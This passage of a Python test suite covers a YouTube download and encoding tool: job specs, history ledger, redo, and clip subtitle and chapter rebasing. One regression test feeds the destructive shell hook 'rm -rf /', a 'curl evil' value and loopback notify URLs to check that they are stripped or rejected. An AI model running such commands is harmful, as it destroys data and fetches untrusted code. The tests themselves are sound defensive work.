    fake_info = {'id': 'vid1', 'title': 'My Clip', 'ext': 'mp4',
                 'requested_formats': [
                     {'format_id': '137', 'vcodec': 'avc1', 'height': 1080, 'ext': 'mp4',
                      'filesize': 10_000_000, 'acodec': 'none'},
                     {'format_id': '140', 'acodec': 'mp4a', 'vcodec': 'none', 'filesize': 1_000_000},
                 ]}

    class _FakeYDL:
        def __init__(self, *a, **k): pass
        def __enter__(self): return self
        def __exit__(self, *a): return False
        def extract_info(self, *a, **k): return fake_info
        def download(self, *a, **k):
            raise AssertionError('simulate must not download')

    orig = Y.__dict__.get('yt_dlp')
    import sys as _sys
    saved_mod = _sys.modules.get('yt_dlp')
    _sys.modules['yt_dlp'] = type('m', (), {'YoutubeDL': _FakeYDL})()
    try:
        eng = FinalYouTubeGPUEngine(output_dir='.')
        spec = JobSpec(urls=['https://youtu.be/vid1'], quality='1080p', encode_mode='reencode',
                       profile='prores_hq', sub_langs=['en'], write_nfo=True)
        plan = eng.simulate(spec)
    finally:
        if saved_mod is not None:
            _sys.modules['yt_dlp'] = saved_mod
        else:
            _sys.modules.pop('yt_dlp', None)
    assert plan['ok'] is True
    assert plan['container'] == '.mov', plan['container']
    assert plan['resolved_format_id'] == '137+140'
    assert plan['resolution'] == '1080p'
    assert '.srt' in plan['sidecars'] and '.nfo' in plan['sidecars']
    assert 'vid1' in plan['output_path'] or '%(id)s' in plan['output_path']
    print('test_simulate_plan_resolves passed')


def test_classify_error_buckets():
    """_classify_error buckets messages consistently (shared by report + _download_error_message)."""
    C = YouTubeDownloader._classify_error
    assert C("Sign in to confirm you're not a bot") == 'bot'
    assert C('Requested format is not available') == 'format'
    assert C('Connection timed out') == 'network'
    assert C('some weird thing exploded') == 'other'
    assert C('') == 'other'
    print('test_classify_error_buckets passed')


def test_partial_report_and_failures_manifest():
    """_render_partial_report writes correct counts and a re-runnable <file>.failures.json that
    _load_manifest reads back into JobSpecs containing only the failed URLs."""
    from Final.yt_final import _render_partial_report, _load_manifest
    from Final.jobspec import JobSpec
    import tempfile, os, json as _json
    d = tempfile.mkdtemp()
    report = os.path.join(d, 'report.json')
    results = [
        {'label': 'a', 'spec': JobSpec(urls=['https://youtu.be/ok']), 'status': 'done',
         'files': ['/x/ok.mp4']},
        {'label': 'b', 'spec': JobSpec(urls=['https://youtu.be/bad']), 'status': 'failed',
         'error': 'Requested format is not available'},
        {'label': 'c', 'spec': JobSpec(urls=['https://youtu.be/bot']), 'status': 'failed',
         'error': "Sign in to confirm you're not a bot"},
    ]
    counts = _render_partial_report(results, report)
    assert counts.get('done') == 1
    assert counts.get('failed:format') == 1 and counts.get('failed:bot') == 1
    # report json
    data = _json.load(open(report, encoding='utf-8'))
    assert data['counts'] == counts and len(data['jobs']) == 3
    # failures manifest is re-runnable: only the 2 failed URLs
    fpath = report + '.failures.json'
    specs = _load_manifest(fpath)
    assert len(specs) == 2
    urls = sorted(s.urls[0] for s in specs)
    assert urls == ['https://youtu.be/bad', 'https://youtu.be/bot']
    print('test_partial_report_and_failures_manifest passed')


# =============================================================================
# Persistent history ledger + re-run with tweaks
# =============================================================================
def test_history_ledger_append_read():
    """HistoryLedger appends JSONL, reads back in order with spec round-trip, survives reopen,
    and tolerates a torn final line."""
    from Final.jobstore import HistoryLedger
    from Final.jobspec import JobSpec
    import tempfile, os
    hf = os.path.join(tempfile.mkdtemp(), 'history.jsonl')
    led = HistoryLedger(hf)
    s1 = JobSpec(urls=['https://youtu.be/a'], profile='premiere_h264_fast')
    s2 = JobSpec(urls=['https://youtu.be/b'], profile='prores4444', encode_mode='reencode')
    led.record(url='https://youtu.be/a', output='/out/a.mp4', profile=s1.profile, status='done', spec=s1)
    led.record(url='https://youtu.be/b', output='/out/b.mov', profile=s2.profile, status='failed', spec=s2)
    rows = led.read()
    assert len(rows) == 2
    assert rows[0]['url'] == 'https://youtu.be/a' and rows[0]['status'] == 'done'
    assert rows[1]['profile'] == 'prores4444'
    # spec round-trips (re-run-with-tweaks depends on this)
    assert JobSpec.from_dict(rows[1]['spec']).encode_mode == 'reencode'
    # survives reopen (a fresh ledger reads the same file)
    assert len(HistoryLedger(hf).read()) == 2
    # tolerates a torn final line
    with open(hf, 'a', encoding='utf-8') as f:
        f.write('{bad torn line')
    rows2 = HistoryLedger(hf).read()
    assert len(rows2) == 2 and rows2[0]['url'] == 'https://youtu.be/a'
    # limit returns the tail
    assert len(HistoryLedger(hf).read(limit=1)) == 1
    print('test_history_ledger_append_read passed')


def test_history_ledger_atomic_concurrent():
    """Concurrent record() from many threads never tears a line: every line is valid JSON and the
    count is exact (mirrors test_claim_next_atomic_and_attempt_cap's concurrency style)."""
    from Final.jobstore import HistoryLedger
    import tempfile, os, threading, json as _json
    hf = os.path.join(tempfile.mkdtemp(), 'history.jsonl')
    led = HistoryLedger(hf)
    errors = []

    def worker(tid):
        try:
            for i in range(10):
                led.record(url=f'u{tid}-{i}', output=f'o{tid}-{i}', profile='p', status='done')
        except Exception as e:
            errors.append(e)

    threads = [threading.Thread(target=worker, args=(t,)) for t in range(4)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    assert not errors, errors
    with open(hf, 'r', encoding='utf-8') as f:
        lines = [ln for ln in f.read().splitlines() if ln.strip()]
    assert len(lines) == 40, f'expected 40 lines, got {len(lines)}'
    for ln in lines:
        _json.loads(ln)   # every line parses (no torn writes)
    print('test_history_ledger_atomic_concurrent passed')


def test_redo_merged_spec():
    """Re-run with tweaks is a pure JobSpec.merged(): urls preserved, the two patched fields change,
    everything else stays at defaults ('redo as ProRes 4444')."""
    from Final.jobspec import JobSpec
    base = JobSpec(urls=['https://youtu.be/x'], encode_mode='copy', profile='premiere_h264_fast')
    new = base.merged(encode_mode='reencode', profile='prores4444')
    assert new.urls == ['https://youtu.be/x']
    assert new.encode_mode == 'reencode' and new.profile == 'prores4444'
    assert new.quality == '1080p' and new.codec is None   # untouched defaults
    # original is not mutated
    assert base.encode_mode == 'copy' and base.profile == 'premiere_h264_fast'
    print('test_redo_merged_spec passed')


def test_redo_resolves_from_journal():
    """The `redo j_xxxx` path resolves a job_id to its durable spec and merges tweaks."""
    from Final.yt_final import _resolve_redo_spec
    from Final.jobstore import DownloadJournal
    from Final.jobspec import JobSpec
    import tempfile, os
    qf = os.path.join(tempfile.mkdtemp(), 'q.json')
    j = DownloadJournal(qf)
    rec = j.add(JobSpec(urls=['https://youtu.be/z'], profile='premiere_h264_fast'))
    spec_dict = _resolve_redo_spec(rec['id'], queue_file=qf)
    assert spec_dict is not None
    new = JobSpec.from_dict(spec_dict).merged(profile='prores4444')
    assert new.urls == ['https://youtu.be/z'] and new.profile == 'prores4444'
    # unknown id -> None
    assert _resolve_redo_spec('j_deadbeef', queue_file=qf) is None
    print('test_redo_resolves_from_journal passed')


def test_redo_resolves_from_history():
    """`redo last` / `redo -1` resolves the newest ledger row's durable spec."""
    from Final.yt_final import _resolve_redo_spec
    from Final.jobstore import HistoryLedger
    from Final.jobspec import JobSpec
    import tempfile, os
    hf = os.path.join(tempfile.mkdtemp(), 'history.jsonl')
    led = HistoryLedger(hf)
    led.record(url='https://youtu.be/one', output='/o/1.mp4', profile='p1', status='done',
               spec=JobSpec(urls=['https://youtu.be/one']))
    led.record(url='https://youtu.be/two', output='/o/2.mp4', profile='p2', status='done',
               spec=JobSpec(urls=['https://youtu.be/two'], quality='720p'))
    last = _resolve_redo_spec('last', history_file=hf)
    assert last is not None and JobSpec.from_dict(last).urls == ['https://youtu.be/two']
    assert JobSpec.from_dict(_resolve_redo_spec('-1', history_file=hf)).quality == '720p'
    assert JobSpec.from_dict(_resolve_redo_spec('0', history_file=hf)).urls == ['https://youtu.be/one']
    assert _resolve_redo_spec('99', history_file=hf) is None   # out of range
    print('test_redo_resolves_from_history passed')


def test_rerun_strips_unsafe_fields():
    """REGRESSION GUARD: web job path never re-arms on_complete (host shell).

    notify_url is allowed only after SSRF validation (private/loopback blocked).
    """
    from Final.jobspec import JobSpec
    from Final.webserver import _web_jobspec_from_payload
    src_spec = JobSpec(urls=['https://youtu.be/x'], on_complete='rm -rf /',
                       notify_url='http://127.0.0.1/hook').to_dict()
    tweaks = {'profile': 'prores4444', 'on_complete': 'curl evil'}
    tweaks.pop('on_complete', None)
    base = JobSpec.from_dict(src_spec).merged(**tweaks)
    # private notify must raise; shell must never survive
    try:
        _web_jobspec_from_payload(base.to_dict())
        raised = False
    except ValueError:
        raised = True
    assert raised, 'private notify_url must be rejected'
    # without notify, shell still stripped and profile kept
    clean = dict(base.to_dict())
    clean['notify_url'] = None
    clean['on_complete'] = 'rm -rf /'
    spec = _web_jobspec_from_payload(clean)
    assert spec.on_complete is None
    assert spec.notify_url is None
    assert spec.profile == 'prores4444' and spec.urls == ['https://youtu.be/x']
    print('test_rerun_strips_unsafe_fields passed')


def test_engine_records_history():
    """The engine.run() chokepoint appends a history row per produced output (and one row on no
    output), via _record_history; disabling _history_enabled suppresses writes."""
    from Final.yt_final import FinalYouTubeGPUEngine
    from Final.jobstore import HistoryLedger
    from Final.jobspec import JobSpec
    import tempfile, os
    hf = os.path.join(tempfile.mkdtemp(), 'history.jsonl')
    eng = FinalYouTubeGPUEngine(output_dir='.')
    eng._history = HistoryLedger(hf)   # redirect the ledger to a temp file (don't touch ~/.yt_final)
    spec = JobSpec(urls=['https://youtu.be/x'], profile='prores4444')
    # success path: two outputs -> two rows
    eng._record_history(spec, ['/o/a.mp4', '/o/b.mp4'])
    # failure path: no outputs -> one row, status failed
    eng._record_history(spec, None)
    rows = HistoryLedger(hf).read()
    assert len(rows) == 3
    assert rows[0]['output'] == '/o/a.mp4' and rows[0]['status'] == 'done'
    assert rows[2]['output'] is None and rows[2]['status'] == 'failed'
    assert rows[0]['profile'] == 'prores4444'
    # disabled -> no new rows
    eng._history_enabled = False
    eng._record_history(spec, ['/o/c.mp4'])
    assert len(HistoryLedger(hf).read()) == 3
    print('test_engine_records_history passed')


def test_explicit_flag_equal_to_default_still_overrides():
    """REGRESSION: an explicit CLI flag whose value equals the parser default (e.g. `--quality 1080p`)
    must still win over a config/preset value. A pure value-vs-default check dropped it, letting the
    preset stand — the opposite of _explicit_overrides' contract."""
    import argparse
    from Final import yt_final as yf
    parser = argparse.ArgumentParser()
    parser.add_argument('--output-dir', dest='output_dir', default='downloads')
    subparsers = parser.add_subparsers(dest='cmd')
    dl = subparsers.add_parser('download')
    dl.add_argument('urls', nargs='*')
    dl.add_argument('--quality', dest='quality', default='1080p')
    dl.add_argument('--profile', dest='profile', default='premiere_h264_fast')

    argv = ['yt_final.py', 'download', 'URL', '--quality', '1080p']
    saved = yf._sys.argv
    try:
        yf._sys.argv = argv
        args = parser.parse_args(argv[1:])
        ov = yf._explicit_overrides(args, dl, parser)
    finally:
        yf._sys.argv = saved

    # explicitly-typed --quality (== its own default) is captured as an override...
    assert ov.get('quality') == '1080p', ov
    # ...but --profile, which was NOT passed, must be absent so a preset's value survives.
    assert 'profile' not in ov, ov
    # sanity: merging over a preset that differs keeps the explicit flag, not the preset value
    from Final.jobspec import JobSpec
    preset = JobSpec(urls=['SHOULD_BE_REPLACED'], quality='480p', profile='prores4444')
    merged = preset.merged(**ov)
    assert merged.quality == '1080p'      # explicit flag wins
    assert merged.profile == 'prores4444'  # untouched preset value survives
    print('test_explicit_flag_equal_to_default_still_overrides passed')


def test_hint_recommends_proxy_when_mobile_and_no_proxy():
    info = {"requested_formats": [{"url": "https://x.googlevideo.com/v?mv=m&n=abc&pot=z"}]}
    h = YouTubeDownloader._network_hint_from_info(info, proxy_active=False)
    assert "cdn=mobile" in h and "Settings" in h


def test_hint_confirms_bypass_when_proxy_active():
    info = {"requested_formats": [{"url": "https://x.googlevideo.com/v?mv=m&n=abc&pot=z"}]}
    h = YouTubeDownloader._network_hint_from_info(info, proxy_active=True)
    assert "via proxy" in h


if __name__ == '__main__':
    test_bandwidth_monitor()
    test_capability_detector_ffmpeg()
    test_ffmpeg_processor_profiles()
    test_build_command_cpu()
    test_history_wired()
    test_ytconfig_and_get_api14_opts()
    test_get_recommended_and_benchmark()
    test_engine_instantiation_and_profiles()
    test_outtmpl_contains_video_id_and_aria_opts()
    test_progress_hook_prints_speed()
    test_next_opts_on_error_keeps_cookies_on_bot()
    test_classify_error_ratelimit_bucket()
    test_next_opts_on_error_backoff_on_ratelimit()
    test_ratelimit_backoff_schedule_short_then_patient()
    test_next_opts_on_error_bot_403_still_rotates_clients()
    test_download_backs_off_before_ratelimit_retry()
    test_ratelimit_wait_heartbeats_and_honors_cancel()
    test_download_with_priority_propagates_cancel()
    test_apply_pot_mode_never_skips_player_configs()
    test_http_chunk_size_never_exceeds_10mib()
    test_js_runtimes_enables_node_when_deno_absent()
    test_extract_only_is_sink_free_and_returns_info()
    test_extract_only_propagates_cancel()
    test_run_body_prefetches_and_passes_info()
    test_degradation_reason_fires_only_on_storyboards_only()
    test_throttle_hint_fires_only_on_shaping_signature()
    test_result_meta_surfaces_throttle_hint()
    test_format_selector_prefers_h264_and_caps()
    test_optimized_opts_native_and_collision_safe()
    test_unique_path_avoids_collision()
    test_new_encoder_profiles_present_and_build()
    test_output_ext_mapping()
    test_bufsize_unit_handling()
    test_download_returns_empty_on_failure_no_fabrication()
    test_no_external_downloader_for_dash()
    test_clients_lead_with_android_vr()
    test_update_version_compare()
    test_update_scan_offline_structure()
    test_diagnose_structure()
    test_diagnose_python_row_passes()
    test_diagnose_exit_code_logic()
    test_diagnose_no_crash_tools_absent()
    test_parse_section()
    # --- 2026 innovation additions (keystones + full-stack) ---
    test_jobspec_roundtrip_and_args()
    test_download_then_process_is_adapter()
    test_build_command_k3_channels()
    test_new_2026_profiles_build()
    test_write_ffmetadata_and_tags()
    test_spec_download_opts()
    test_download_journal()
    test_manifest_loader()
    # --- regression tests for adversarial-verification fixes ---
    test_mux_sidecars_container_family()
    test_config_not_autoloaded_without_opt_in()
    test_on_complete_no_shell_injection()
    test_claim_next_atomic_and_attempt_cap()
    test_queue_priority_ordering()
    test_queue_pause_blocks_claim()
    test_queue_cancel_single_job()
    test_result_meta_and_speed_stats()
    test_queue_remove_single_job()
    test_priority_default_and_legacy()
    test_output_dir_redirect()
    test_download_error_messages()
    test_validate_url_hardened()
    test_markers_export()
    test_markers_dropframe_2997()
    test_markers_ndf_23976()
    test_markers_csv_colors_and_notes()
    test_distill_preserves_sponsorblock()
    test_sponsorblock_markers_export()
    test_jobspec_sponsorblock_markers_field()
    test_markers_fcpxml_rational()
    test_markers_5994_dropframe()
    test_jobspec_marker_and_shorts_fields()
    test_markers_vtt()
    test_write_text_sidecars()
    test_jobspec_sub_format_and_sidecar_text()
    test_spec_download_opts_sub_format()
    test_nfo_export()
    test_watch_feed_parse_and_resolve()
    test_watch_match_filters()
    test_watchstore_filters_roundtrip()
    test_watchstore_defaults_full_jobspec()
    test_jobspec_nextgen_fields()
    test_nfo_kind_auto_and_episode()
    test_tvshow_nfo_export()
    test_jobspec_nfo_artwork_fields()
    test_write_artwork_from_jpg()
    # --- regression tests for the critical+high audit fixes ---
    test_bot_message_keeps_cookies()
    test_encode_to_preserves_original_on_failure()
    test_fire_webhook_rejects_ssrf()
    test_notify_template_builds_bodies()
    test_notify_template_jobspec_roundtrip()
    test_markers_newline_title()
    test_recover_orphaned_running()
    test_cookie_discovery_precedence()
    test_cookie_discovery_none()
    # --- post-download integrity check (--verify-strict) ---
    test_verify_strict_jobspec_field()
    test_probe_integrity_parses()
    test_verify_output_passes_good()
    test_verify_output_fails_short_duration_strict()
    test_verify_output_fails_missing_audio()
    test_verify_nonstrict_only_warns()
    test_verify_skips_unknown_duration()
    test_verify_audio_only_allows_no_video()
    # --- Rec.709 / colorspace container tagging ---
    test_sdr_color_args_tags_untagged()
    test_sdr_color_args_respects_existing()
    test_sdr_color_args_hdr_untouched()
    test_color_tag_flows_to_extra_out_args()
    test_color_tag_jobspec_roundtrip()
    # --- burn-in slate (--burn-in) + dual-mono split (--audio-map) ---
    test_burn_in_drawtext_escape()
    test_burn_in_vf_skipped_on_copy()
    test_burn_in_vf_composes_with_subtitles()
    test_audio_map_dual_mono_args()
    test_audio_map_coexists_with_color_tag()
    test_audio_map_gated_to_mov_mkv()
    test_audio_map_forces_reencode_and_audio_codec()
    test_burn_in_audio_map_jobspec_roundtrip()
    test_audio_map_folds_vf_into_filter_complex()
    test_ntfy_title_header_strips_crlf()
    test_to_vtt_no_zero_length_cue()
    test_watch_after_accepts_iso_date()
    test_sponsorblock_mark_uses_real_categories()
    test_plan_audio_map_coerces_any_container()
    test_fcpxml_escapes_attribute_quotes()
    test_jobstore_list_returns_copies()
    test_watchstore_dedupes_within_batch()
    test_watchstore_first_poll_baselines_feed()
    test_watchstore_pending_newest_first_and_refresh_titles()
    test_watchstore_auto_enqueue_does_not_hold_mutex()
    test_watchstore_auto_enqueue_failure_retries_then_gives_up()
    test_watchstore_readd_merges_settings()
    test_probe_duration_caches_by_video()
    # --- list-formats --json/--format-id, --simulate, partial-failure report ---
    test_format_id_overrides_selection()
    test_list_formats_json_rows()
    test_simulate_plan_resolves()
    test_classify_error_buckets()
    test_partial_report_and_failures_manifest()
    # --- persistent history ledger + re-run with tweaks ---
    test_history_ledger_append_read()
    test_history_ledger_atomic_concurrent()
    test_redo_merged_spec()
    test_redo_resolves_from_journal()
    test_redo_resolves_from_history()
    test_rerun_strips_unsafe_fields()
    test_engine_records_history()
    test_explicit_flag_equal_to_default_still_overrides()
    print('All smoke tests passed')


def test_notify_vet_blocks_private_addresses():
    from yt_final import FinalYouTubeGPUEngine as E
    # IP-literal private/loopback targets must be rejected without any DNS dependency
    for bad in ('http://127.0.0.1:9000/x', 'http://10.0.0.5/hook', 'http://169.254.1.1/', 'http://[::1]/'):
        err, ip = E._vet_notify_url(bad)
        assert err and ip is None, (bad, err, ip)
        assert E.validate_notify_url(bad)  # public API still returns the error string
    assert E._vet_notify_url('ftp://example.com/')[0]        # non-http scheme rejected


def test_url_with_comma_is_not_shredded():
    from jobspec import JobSpec, _as_url_list
    u = "https://www.youtube.com/watch?v=abc&list=PL1,2,3"
    assert _as_url_list(u) == [u]                 # a single URL containing commas stays intact
    assert _as_url_list([u]) == [u]
    assert _as_url_list("a\nb  c") == ["a", "b", "c"]   # whitespace/newlines still separate URLs
    assert JobSpec.from_dict({"url": u}).urls == [u]     # 'url' alias too


def test_prune_count_based_archives_when_all_recent(tmp_path):
    from Final.jobstore import DownloadJournal, STATUS_DONE
    import time as _t
    j = DownloadJournal(str(tmp_path / "q.json"))
    now = _t.time()
    # 5 terminal jobs, all < keep_days old (j0 newest ... j4 oldest); threshold 3
    data = {"jobs": [{"id": f"j{i}", "status": STATUS_DONE, "updated_at": now - i} for i in range(5)]}
    j._maybe_prune(data, threshold=3, keep_days=30)
    kept = {x["id"] for x in data["jobs"]}
    assert kept == {"j0", "j1", "j2"}             # oldest 2 archived down to threshold, despite being recent


# --- F2: sidecars must describe the delivered CLIP, not the source video --------------------

def test_clip_chapters_clamps_rebases_and_drops():
    """Pure transform, every edge case. A chapter is dropped when entirely outside the window,
    clamped when it straddles a boundary, and always rebased so the clip timeline starts at 0."""
    from Final.yt_final import FinalYouTubeGPUEngine
    C = FinalYouTubeGPUEngine._clip_chapters
    chs = [
        {'start_time': 0,   'end_time': 60,  'title': 'before'},      # entirely before -> drop
        {'start_time': 60,  'end_time': 120, 'title': 'head'},        # straddles start -> clamp
        {'start_time': 120, 'end_time': 150, 'title': 'inside'},      # fully inside -> rebase only
        {'start_time': 150, 'end_time': 300, 'title': 'tail'},        # straddles end -> clamp
        {'start_time': 300, 'end_time': 600, 'title': 'after'},       # entirely after -> drop
    ]
    out = C(chs, 90.0, 180.0)
    assert [c['title'] for c in out] == ['head', 'inside', 'tail']
    assert (out[0]['start_time'], out[0]['end_time']) == (0.0, 30.0)     # 60-120 clamped to 90-120
    assert (out[1]['start_time'], out[1]['end_time']) == (30.0, 60.0)    # rebased by -90
    assert (out[2]['start_time'], out[2]['end_time']) == (60.0, 90.0)    # 150-300 clamped to 150-180
    assert all(c['start_time'] >= 0 and c['end_time'] <= 90.0 for c in out)

    assert C([], 0, 10) == [] and C(None, 0, 10) == []
    # exact-boundary touches are not overlaps
    assert C([{'start_time': 0, 'end_time': 90, 'title': 'x'}], 90.0, 180.0) == []
    # junk entries are skipped, not fatal
    assert C(['nope', {'start_time': 'bad', 'end_time': 1}], 0, 10) == []


def test_clip_local_info_is_identity_without_a_real_section():
    """The 99% path must be byte-identical — and the guard is _parse_section(), not spec.section,
    because a whitespace-only section is TRUTHY yet downloads the whole video."""
    from types import SimpleNamespace
    from Final.yt_final import FinalYouTubeGPUEngine
    eng = FinalYouTubeGPUEngine.__new__(FinalYouTubeGPUEngine)
    info = {'duration': 600, 'chapters': [{'start_time': 0, 'end_time': 600, 'title': 'all'}]}

    def _boom(*a, **k):
        raise AssertionError('probed the output on a non-clip job')
    eng.processor = SimpleNamespace(probe_integrity=_boom)

    for section in (None, '', '   ', 'not-a-range'):
        got = eng._clip_local_info(info, SimpleNamespace(section=section), Path('x.mp4'))
        assert got is info, f'section={section!r} must return the SAME object untouched'


def test_clip_local_info_rewrites_duration_and_chapters():
    """With a real clip, duration comes from the PROBED file and chapters are clipped/rebased —
    so FCPXML/CSV/NFO/VTT all describe the 90s clip instead of the 600s source."""
    from types import SimpleNamespace
    from Final.yt_final import FinalYouTubeGPUEngine
    eng = FinalYouTubeGPUEngine.__new__(FinalYouTubeGPUEngine)
    eng.processor = SimpleNamespace(probe_integrity=lambda src: {'duration': 89.5})
    info = {'duration': 600, 'title': 'T',
            'chapters': [{'start_time': 0, 'end_time': 100, 'title': 'a'},
                         {'start_time': 500, 'end_time': 600, 'title': 'z'}]}
    got = eng._clip_local_info(info, SimpleNamespace(section='90-180'), Path('clip.mp4'))

    assert got is not info and info['duration'] == 600      # source dict untouched
    assert got['duration'] == 89.5                          # probed, not the 90.0 window guess
    assert [c['title'] for c in got['chapters']] == ['a']    # 'z' is outside the clip
    assert got['chapters'][0]['start_time'] == 0.0
    assert got['title'] == 'T'                               # unrelated fields pass through

    # probe failure -> fall back to the requested window rather than the source duration
    eng.processor = SimpleNamespace(probe_integrity=lambda src: {})
    assert eng._clip_local_info(info, SimpleNamespace(section='90-180'), Path('c.mp4'))['duration'] == 90.0


# --- B4: resource caps — a public API client must not spawn a thread bomb ------------------

def test_download_parallel_caps_workers_at_16(monkeypatch):
    """An explicit workers value (e.g. from a public JobSpec) must be capped at 16, not fed raw to
    ThreadPoolExecutor. Capping is speed-neutral: concurrent media 403s on the per-IP gate anyway."""
    from Final.yt_final import YouTubeDownloader
    dl = YouTubeDownloader.__new__(YouTubeDownloader)
    dl.max_workers = 16
    seen = {}

    class _Pool:
        def __init__(self, max_workers=None, **k):
            seen['workers'] = max_workers
        def __enter__(self):
            return self
        def __exit__(self, *a):
            return False
        def submit(self, fn, *a, **k):
            raise RuntimeError('stop before any real work')

    import Final.yt_final as ytf
    monkeypatch.setattr(ytf, 'ThreadPoolExecutor', _Pool, raising=False)
    dl._warm_probe_caches = lambda spec: None
    try:
        dl.download_parallel(['u1', 'u2'], max_workers=500, spec=None)
    except Exception:
        pass
    assert seen.get('workers') == 16, f'workers not capped: {seen}'
    # a sane value passes through unchanged
    seen.clear()
    try:
        dl.download_parallel(['u1'], max_workers=4, spec=None)
    except Exception:
        pass
    assert seen.get('workers') == 4


def test_concurrent_fragments_capped_at_16():
    """concurrent_fragments must be floored at 1 AND capped at 16 in the built ydl opts, so a
    client's 500 can't become 500 fragment threads."""
    from types import SimpleNamespace
    from Final.yt_final import FinalYouTubeGPUEngine, YouTubeDownloader
    dl = FinalYouTubeGPUEngine(output_dir='.').downloader
    opts = dl.get_optimized_ydl_opts('1080p', spec=SimpleNamespace(
        concurrent_fragments=500, audio_format=None, subtitles=None, download_archive=None,
        sponsorblock=None, thumbnail=None, proxy=None, section=None))
    assert opts.get('concurrent_fragment_downloads') == 16, opts.get('concurrent_fragment_downloads')
    opts2 = dl.get_optimized_ydl_opts('1080p', spec=SimpleNamespace(
        concurrent_fragments=4, audio_format=None, subtitles=None, download_archive=None,
        sponsorblock=None, thumbnail=None, proxy=None, section=None))
    assert opts2.get('concurrent_fragment_downloads') == 4


# --- B6: --section subtitle cues must be rebased to the clip timeline -----------------------

def test_rebase_subtitle_srt_clamps_drops_rebases():
    """SRT cues: drop fully-outside, clamp straddlers, shift by -cs, renumber. For section 90-180
    a cue at 95-100 becomes 5-10 (not the source-relative 95-100 that lands off a 90s clip)."""
    from Final.yt_final import FinalYouTubeGPUEngine as E
    srt = (
        "1\n00:00:10,000 --> 00:00:20,000\nbefore\n\n"       # <90 -> drop
        "2\n00:01:35,000 --> 00:01:40,000\ninside\n\n"       # 95-100 -> 5-10
        "3\n00:02:50,000 --> 00:05:00,000\ntail\n\n"          # 170-300 straddles 180 -> 80-90
        "4\n00:06:00,000 --> 00:06:10,000\nafter\n"           # >180 -> drop
    )
    out = E._rebase_subtitle_text(srt, 90.0, 180.0)
    assert 'before' not in out and 'after' not in out
    assert '00:00:05,000 --> 00:00:10,000' in out and 'inside' in out
    assert '00:01:20,000 --> 00:01:30,000' in out and 'tail' in out    # 170-180 clamped, rebased
    # renumbered 1,2 after the drop
    assert out.lstrip().startswith('1\n') and '\n2\n' in out


def test_rebase_subtitle_vtt_preserves_header_and_settings():
    """VTT: the WEBVTT header and per-cue settings survive; hours-optional MM:SS.mmm parses."""
    from Final.yt_final import FinalYouTubeGPUEngine as E
    vtt = ("WEBVTT\n\n"
           "00:01:35.000 --> 00:01:40.000 align:start position:50%\nkeep\n\n"
           "00:00:05.000 --> 00:00:08.000\ndrop\n")
    out = E._rebase_subtitle_text(vtt, 90.0, 180.0)
    assert out.startswith('WEBVTT')
    assert '00:00:05.000 --> 00:00:10.000 align:start position:50%' in out and 'keep' in out
    assert 'drop' not in out


def test_rebase_subtitle_failsafe_on_garbage():
    """Unparseable content is returned UNCHANGED — source-relative subs beat corrupted ones."""
    from Final.yt_final import FinalYouTubeGPUEngine as E
    junk = "not a subtitle file at all\nrandom text\n"
    assert E._rebase_subtitle_text(junk, 90.0, 180.0) == junk
    # a cue with a broken timestamp line is left intact rather than dropped
    broken = "1\n99:99 --> nonsense\ntext\n"
    assert 'text' in E._rebase_subtitle_text(broken, 0.0, 10.0)


# --- B7: batch/queue must exit nonzero when an item failed (scripting/CI) -------------------

def test_batch_failed_helper_only_counts_real_failures():
    from Final.yt_final import _batch_failed
    assert _batch_failed([{'status': 'done'}, {'status': 'done'}]) is False
    assert _batch_failed([{'status': 'done'}, {'status': 'cancelled'}]) is False   # cancel != failure
    assert _batch_failed([{'status': 'skipped'}]) is False
    assert _batch_failed([{'status': 'done'}, {'status': 'failed'}]) is True         # one lost item
    assert _batch_failed([]) is False and _batch_failed(None) is False


def test_cli_queue_run_exits_nonzero_when_a_job_failed(monkeypatch, tmp_path):
    """A queue run that lost a job must exit(1), not report success to a calling script."""
    import sys as _sys
    from Final import yt_final
    from Final.jobstore import DownloadJournal
    # Same import root as DownloadJournal above. Final.jobstore validates through
    # Final.state_validation, whose isinstance gate is against Final.jobspec.JobSpec; a flat
    # `from jobspec import ...` is only the same class while yt_final's sys.modules.setdefault
    # alias happened to win, so it breaks whenever a flat importer is collected first.
    from Final.jobspec import JobSpec

    qpath = tmp_path / 'queue.json'
    jq = DownloadJournal(str(qpath))
    jq.add(JobSpec.from_dict({'urls': ['https://youtu.be/x']}))

    class _FakeEngine:
        def __init__(self, *a, **k):
            self.downloader = type('D', (), {'cancel_check': None,
                                             'last_error': 'boom', 'last_error_kind': None})()
        def run(self, spec):
            return []                                   # produced nothing -> failed
    monkeypatch.setattr(yt_final, 'FinalYouTubeGPUEngine', _FakeEngine)
    monkeypatch.setattr(_sys, 'argv', ['yt_final.py', '--output-dir', str(tmp_path / 'dl'),
                                       'queue', 'run', '--queue-file', str(qpath)])
    import pytest
    with pytest.raises(SystemExit) as ei:
        yt_final.main()
    assert ei.value.code == 1


# --- B3 Stage 2: a cancel must be able to interrupt a running ffmpeg encode -----------------

def test_run_ffmpeg_normal_path_unaffected(tmp_path):
    """The default path (no cancel_check, or a non-firing one) must behave exactly as before:
    return True on rc=0. This is the guard that the cancel hook did not disturb normal encodes."""
    import sys as _sys
    from Final.yt_final import FinalYouTubeGPUEngine
    proc = FinalYouTubeGPUEngine(output_dir=str(tmp_path)).processor
    quick = [_sys.executable, '-c', 'import sys; sys.stderr.write("time=00:00:01.00\\n")']
    assert getattr(proc, 'cancel_check', None) is None
    assert proc._run_ffmpeg(quick) is True                 # default: unchanged
    proc.cancel_check = lambda: False                       # installed but not firing
    assert proc._run_ffmpeg(quick) is True


def test_run_ffmpeg_cancel_kills_process_and_raises(tmp_path):
    """A cancel observed mid-encode must kill ffmpeg promptly and raise DownloadCancelled (NOT be
    swallowed into a return False), so the runner records the job as cancelled."""
    import sys as _sys, time as _t, pytest
    from Final.yt_final import FinalYouTubeGPUEngine, DownloadCancelled
    proc = FinalYouTubeGPUEngine(output_dir=str(tmp_path)).processor
    # a fake ffmpeg that emits progress-like stderr forever until killed
    forever = [_sys.executable, '-c',
               'import sys,time\n'
               'while True:\n sys.stderr.write("frame= 1 time=00:00:01.00\\n"); sys.stderr.flush(); time.sleep(0.03)']
    proc.cancel_check = lambda: True                        # cancel already requested
    t0 = _t.monotonic()
    with pytest.raises(DownloadCancelled):
        proc._run_ffmpeg(forever)
    assert _t.monotonic() - t0 < 5.0, 'cancel did not stop the encode promptly'


def test_download_parallel_logs_partial_failures(monkeypatch):
    """B4: a --parallel batch where some URLs succeed and others fail must not silently drop the
    losers. Their errors (already collected) are logged instead of discarded. Post-download only —
    nothing on the transfer path changes."""
